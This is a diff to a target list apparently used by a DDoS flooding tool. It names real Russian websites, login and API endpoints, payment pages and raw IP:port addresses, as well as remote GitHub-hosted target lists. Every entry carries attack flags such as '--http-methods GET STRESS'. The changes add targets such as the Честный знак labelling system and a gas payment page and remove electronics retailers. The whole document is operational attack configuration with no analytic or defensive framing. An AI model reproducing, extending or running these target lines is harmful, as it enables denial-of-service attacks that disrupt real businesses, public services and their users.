@@ -1,8 +1,8 @@
-https://www.crpt.ru https://markirovka.crpt.ru/login-kep https://milk.crpt.ru/ https://ismp.crpt.ru https://suzgrid.crpt.ru/login http://api.mdlp.crpt.ru http://kb.crpt.ru http://nrz.api.sb.mdlp.crpt.ru http://api.sb.mdlp.crpt.ru --http-methods GET STRESS
+https://www.crpt.ru https://markirovka.crpt.ru/login-kep https://milk.crpt.ru/ https://ismp.crpt.ru https://suzgrid.crpt.ru/login http://api.mdlp.crpt.ru http://kb.crpt.ru https://support.crpt.ru/Login/SspLogin.aspx?ReturnUrl=%2F http://nrz.api.sb.mdlp.crpt.ru http://api.sb.mdlp.crpt.ru https://честныйзнак.рф/potrebitelyam/ tcp://82.202.190.166:443 --http-methods GET STRESS
 
 -c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/atolAPI/get.lst --http-methods GET STRESS
 
-https://www.aktorstc.ru http://ooo-extruzia.ru/order https://mikron.ru https://www.gamma.spb.ru https://mail1.gamma.spb.ru https://e-components.ru https://mail.sp.ru https://micel.ru https://www.chipdip.ru https://micro-bond.com/moskva/ https://www.protehnology.ru https://www.micro-electronics.ru https://electron1ca.ru https://elektronika.store https://www.wite.ru https://www.landcom.ru https://re-store.ru/apple-iphone https://apple-store.net.ru/apple-iphone/ https://biggeek.ru --http-methods GET STRESS
+https://www.crpt.ru https://markirovka.crpt.ru/login-kep https://milk.crpt.ru/ https://ismp.crpt.ru https://suzgrid.crpt.ru/login http://api.mdlp.crpt.ru http://kb.crpt.ru https://support.crpt.ru/Login/SspLogin.aspx?ReturnUrl=%2F http://nrz.api.sb.mdlp.crpt.ru http://api.sb.mdlp.crpt.ru https://честныйзнак.рф/potrebitelyam/ tcp://82.202.190.166:443 --http-methods GET STRESS
 
 https://dostavista.ru https://www.delivery-club.ru/moscow https://dotochki.com https://www.pochta.ru https://podpiska.pochta.ru https://zakaznoe.pochta.ru https://otpravka.pochta.ru --http-methods GET STRESS
 
@@ -106,6 +106,10 @@ https://213.59.254.7:443 http://213.59.253.7:80 https://213.59.253.7:443 --http-
 -c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp2 --http-methods GET STRESS
 
 -c https://raw.githubusercontent.com/alexnest-ua/targets/main/api_auto_mila --http-methods GET
+
+-с https://raw.githubusercontent.com/alexnest-ua/targets/main/special/biggeek_re-store --http-methods GET STRESS
+
+https://www.a-3.ru/pay_gaz --http-methods GET STRESS
 
 https://www.ponyexpress.ru/ tcp://185.10.63.194:80 tcp://185.10.63.194:443 --http-methods GET STRESS
 
